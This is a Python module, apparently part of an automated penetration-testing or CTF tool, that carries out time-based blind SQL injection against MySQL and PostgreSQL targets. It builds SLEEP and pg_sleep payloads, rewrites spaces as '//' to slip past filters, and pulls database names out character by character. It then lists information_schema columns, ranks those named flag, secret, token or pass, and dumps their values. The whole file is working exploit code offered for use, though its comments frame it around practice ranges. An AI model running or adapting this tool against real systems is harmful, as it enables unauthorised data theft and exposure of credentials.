# -*- coding: utf-8 -*-
"""轻量盲注提取：用已确认的注入形态逐字符取标量（库名/版本/表名）。

为什么需要（2026-10-18 54212/49920 实测）：
- sqlmap 的布尔盲注 `--dbs` 在限流靶机上 900s 跑不完，还把目标打到 unable to connect；
- 过滤型目标（空格被吃掉）sqlmap 的常规前缀不生效，而 AI 直发已验证 `//` 形态可用。

本模块复用「已确认 payload 的注入语境」，以**时间盲注二分提取**，请求量可控：
  - 先二分取 length(expr)，再逐字符二分 ASCII；
  - 每个判断 = 1 次请求（灰区重测 1 次），每次 sleep 2s；
  - 8 字符库名约 15-20 次请求，远少于 sqlmap 的全库枚举。
"""
from __future__ import annotations

import statistics

from app.services.prober import _build_request, _elapsed, _is_waf_block

_SEC = 2
_GREY_LOW = 0.4
_ASCII_FN = {"postgresql": "ascii", "mysql": "ascii", "sqlite": "unicode"}
_SUBSTR_FN = {"postgresql": "substring", "mysql": "substring", "sqlite": "substr"}


def normalize_dbms(dbms: str) -> str:
    d = (dbms or "").lower()
    if "postgres" in d:
        return "postgresql"
    if "mysql" in d or "mariadb" in d:
        return "mysql"
    if "sqlite" in d:
        return "sqlite"
    return d


def _cond(expr: str, i: int, op: str, mid: int, dbms: str) -> str:
    fn = _ASCII_FN.get(dbms, "ascii")
    sub = _SUBSTR_FN.get(dbms, "substring")
    return f"{fn}({sub}(({expr}),{i},1)){op}{mid}"


def _length_cond(expr: str, op: str, mid: int) -> str:
    return f"length(({expr})){op}{mid}"


def build_payload(base: str, cond: str, dbms: str, *, quote: str = "'",
                  slash: bool = False, sec: int = _SEC) -> str | None:
    # quote：由已确认 payload 反推的闭合符（' 或 "），不能硬编码单引号。
    """把条件包进时间盲注表达式；不支持的类型返回 None。"""
    if dbms == "postgresql":
        body = (f"CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sec})) "
                f"IS NOT NULL ELSE FALSE END")
    elif dbms == "mysql":
        body = f"IF(({cond}), SLEEP({sec}), 0)"
    else:
        return None
    payload = f"{base}{quote} AND {body}-- -"
    return payload.replace(" ", "//") if slash else payload


def time_hit(baseline_s: float, probe_s: float, sec: int = _SEC) -> bool:
    return (probe_s - baseline_s) >= max(0.8, sec * 0.6)


class _Prober:
    def __init__(self, client, endpoint, param, base_value, dbms, slash_first=False,
                 quote: str = "'", sec: int = _SEC, deadline: float | None = None):
        self.client = client
        self.endpoint = endpoint
        self.param = param
        self.base_value = str(base_value or "1")
        self.dbms = dbms
        self.slash = bool(slash_first)
        # 注入语境：`1" and ...` 靶点必须用双引号闭合（2026-10-23 某靶场）。
        # 旧实现硬编码单引号，双引号语境下提取必然全错。
        self.quote = quote or "'"
        self.sec = sec
        self.deadline = deadline          # 绝对时间戳（time.monotonic 基准）
        self.requests = 0
        self.error: str | None = None

    def _send(self, payload: str):
        url, params, data = _build_request(self.endpoint, self.param, payload)
        resp = self.client.request(self.endpoint.method, url, params=params,
                                   data=data, payload=payload)
        return resp, _elapsed(self.client)

    def _measure_baseline(self) -> float:
        times = []
        for _ in range(2):
            try:
                resp, t = self._send(self.base_value)
            except Exception as exc:
                self.error = str(exc)
                return 0.0
            self.requests += 1
            if _is_waf_block(resp):
                self.error = "waf_blocked"
                return 0.0
            times.append(t)
        return statistics.median(times) if times else 0.0

    def _slow(self, cond: str) -> bool | None:
        """发一次时间条件；灰区（可能抖动）重测一次取中位数。"""
        import time as _time
        if self.deadline and _time.monotonic() > self.deadline:
            self.error = "deadline"
            return None
        payload = build_payload(self.base_value, cond, self.dbms, slash=self.slash,
                                quote=self.quote, sec=self.sec)
        if not payload:
            return None
        times = []
        for attempt in range(2):
            try:
                resp, t = self._send(payload)
            except Exception as exc:
                self.error = str(exc)
                return None
            self.requests += 1
            if _is_waf_block(resp):
                self.error = "waf_blocked"
                return None
            times.append(t)
            if attempt == 0 and not (_GREY_LOW <= t <= self.sec * 1.4):
                break                      # 不在灰区，一次就够
        t = statistics.median(times)
        return time_hit(self.baseline, t, self.sec)

    def extract_int(self, expr_cond_builder, lo: int, hi: int) -> int | None:
        while lo < hi:
            mid = (lo + hi) // 2
            slow = self._slow(expr_cond_builder(mid))
            if slow is None:
                return None
            if slow:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def extract_string(self, expr: str, max_len: int = 32) -> str | None:
        self.baseline = self._measure_baseline()
        if self.error:
            return None
        length = self.extract_int(lambda m: _length_cond(expr, ">", m), 0, max_len + 1)
        if length is None or length <= 0 or length > max_len:
            return ""
        out = []
        for i in range(1, length + 1):
            cp = self.extract_int(lambda m: _cond(expr, i, ">", m, self.dbms), 31, 127)
            if cp is None or not (31 <= cp <= 126):
                return None
            out.append(chr(cp))
        return "".join(out)


def extract_scalar(client, endpoint, param: str, base_value, dbms: str, expr: str,
                   *, slash_first: bool = False, max_len: int = 32,
                   quote: str = "'", sec: int = _SEC,
                   deadline: float | None = None) -> dict:
    """提取标量字符串（如 current_database()）。

    返回 {value, requests, error}。value 为空字符串表示条件成立但不可见。
    quote：注入语境闭合符（由已确认 payload 反推）；sec：单次 sleep 秒数。
    """
    nd = normalize_dbms(dbms)
    if nd not in ("postgresql", "mysql"):
        return {"value": None, "requests": 0,
                "error": f"unsupported dbms for time extraction: {dbms}"}
    prober = _Prober(client, endpoint, param, base_value, nd, slash_first=slash_first,
                     quote=quote, sec=sec, deadline=deadline)
    value = prober.extract_string(expr, max_len=max_len)
    return {"value": value, "requests": prober.requests, "error": prober.error}


# 表/列名清单一次性取回（MySQL）：concat 用 0x3a 冒号连接，group_concat 默认逗号分隔。
_COLS_EXPR_MYSQL = ("(select group_concat(concat(table_name,0x3a,column_name)) "
                    "from information_schema.columns where table_schema=database())")
# 先只取 flag/secret 命名的列（盲注逐字符，清单越短越快）：
# 0x25666c616725 = "%flag%"，0x2573656372657425 = "%secret%"
_COLS_EXPR_MYSQL_FILTERED = (
    "(select group_concat(concat(table_name,0x3a,column_name)) "
    "from information_schema.columns where table_schema=database() and ("
    "table_name like 0x25666c616725 or column_name like 0x25666c616725 or "
    "table_name like 0x2573656372657425 or column_name like 0x2573656372657425))")

_FLAG_KEYWORDS = ("flag", "secret", "key", "token", "pass", "answer")


def _score_column(table: str, column: str) -> int:
    """flag/secret 类列名优先；表名命中次之（靶场库里几乎都用这类命名）。"""
    t, c = (table or "").lower(), (column or "").lower()
    s = 0
    for kw in _FLAG_KEYWORDS:
        if kw in c:
            s += 2
        if kw in t:
            s += 1
    return s


def extract_flag_blind(client, endpoint, param: str, base_value, dbms: str, *,
                       quote: str = "'", sec: int = 1,
                       deadline: float | None = None, max_len: int = 96) -> dict:
    """纯时间盲注靶直接取 flag（只读 SELECT，最短路径）。

    2026-10-23 某靶场 实测：sqlmap 时间盲注枚举 `--current-db` 300s 都跑不完
    （每字符多次 SLEEP 5s），而本模块二分提取用 sleep(1~2) 即可。
    做法：一次性取 `table:column` 清单 → 按 flag/secret 关键词排序 →
    `group_concat(列)` 取值。仅支持 MySQL（本机靶场均为 MySQL；PG 走 sqlmap）。
    返回 {value, table, column, columns, requests, error}。
    """
    if normalize_dbms(dbms) != "mysql":
        return {"value": None, "requests": 0, "error": f"unsupported dbms: {dbms}"}
    prober = _Prober(client, endpoint, param, base_value, "mysql",
                     quote=quote, sec=sec, deadline=deadline)
    # 先取 flag/secret 命名的列（短清单）；没有再做全量列清单。
    cols_raw = prober.extract_string(_COLS_EXPR_MYSQL_FILTERED, max_len=96) or ""
    pairs: list[tuple[str, str]] = []
    if not cols_raw and not prober.error:
        cols_raw = prober.extract_string(_COLS_EXPR_MYSQL, max_len=128) or ""
    for item in cols_raw.split(","):
        if ":" in item:
            t, c = item.split(":", 1)
            if t and c:
                pairs.append((t.strip(), c.strip()))
    if not pairs:
        return {"value": None, "table": None, "column": None,
                "columns": cols_raw, "requests": prober.requests,
                "error": prober.error or "columns_empty"}
    pairs.sort(key=lambda tc: -_score_column(*tc))
    for table, column in pairs[:3]:
        expr = f"(select group_concat(`{column}` separator 0x7c) from `{table}`)"
        val = prober.extract_string(expr, max_len=max_len)
        if val:
            return {"value": val, "table": table, "column": column,
                    "columns": cols_raw, "requests": prober.requests,
                    "error": prober.error}
        if prober.error:
            break
    return {"value": None, "table": None, "column": None, "columns": cols_raw,
            "requests": prober.requests, "error": prober.error or "value_empty"}
